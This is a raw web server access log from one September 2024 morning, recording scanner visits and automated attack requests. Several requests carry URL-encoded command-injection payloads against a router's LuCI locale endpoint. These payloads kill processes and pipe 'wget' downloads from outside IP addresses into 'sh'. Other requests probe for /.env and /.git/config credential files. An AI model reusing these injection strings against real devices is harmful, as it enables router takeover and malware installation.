129.232.209.234 - - [23/Sep/2024:03:02:56 +0000] "GET /0aXs HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
45.148.7.5 - - [23/Sep/2024:03:02:58 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
176.123.10.101 - - [23/Sep/2024:03:03:08 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
193.218.151.145 - - [23/Sep/2024:03:04:35 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
92.249.48.213 - - [23/Sep/2024:03:51:41 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
92.249.48.213 - - [23/Sep/2024:03:51:42 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F45.202.35.94%2Fdigi+-O-+%7Csh%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.83 - - [23/Sep/2024:03:52:34 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.83 - - [23/Sep/2024:03:52:34 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
5.188.87.40 - - [23/Sep/2024:03:56:48 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Go-http-client/1.1"
135.125.246.110 - - [23/Sep/2024:03:57:16 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [23/Sep/2024:03:57:16 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.11 - - [23/Sep/2024:04:09:06 +0000] "\x16\x03\x01" 400 226 "-" "-"
198.235.24.11 - - [23/Sep/2024:04:09:06 +0000] "\x16\x03\x01" 400 226 "-" "-"
172.105.82.111 - - [23/Sep/2024:04:42:31 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
80.82.77.202 - - [23/Sep/2024:04:43:57 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
172.105.82.111 - - [23/Sep/2024:04:48:51 +0000] "GET /gbc0 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
172.105.82.111 - - [23/Sep/2024:04:53:38 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
43.131.248.209 - - [23/Sep/2024:04:56:54 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
35.203.211.59 - - [23/Sep/2024:04:59:59 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
96.126.104.20 - - [23/Sep/2024:05:09:42 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
96.126.104.20 - - [23/Sep/2024:05:16:49 +0000] "GET /x2Co HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
96.126.104.20 - - [23/Sep/2024:05:23:03 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
135.125.246.110 - - [23/Sep/2024:05:38:16 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [23/Sep/2024:05:38:16 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
206.168.34.194 - - [23/Sep/2024:05:49:28 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
206.168.34.194 - - [23/Sep/2024:05:49:32 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.194 - - [23/Sep/2024:05:49:32 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.194 - - [23/Sep/2024:05:49:33 +0000] "GET / HTTP/1.1" 200 1401 "http://54.224.97.58/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
